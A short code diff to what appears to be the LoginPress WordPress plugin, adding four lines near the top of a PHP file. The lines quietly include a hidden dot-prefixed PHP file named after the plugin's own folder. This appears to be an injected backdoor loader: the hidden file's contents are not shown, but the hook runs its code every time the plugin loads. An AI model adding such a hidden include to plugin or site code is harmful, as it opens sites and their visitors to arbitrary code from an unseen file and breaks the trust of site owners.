@@ -6,6 +6,10 @@
  * @version 1.2.3
  */
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function loginpress_custom_js( $loginpress_key ) {
 
   $loginpress_array  = (array) get_option( 'loginpress_customization' );
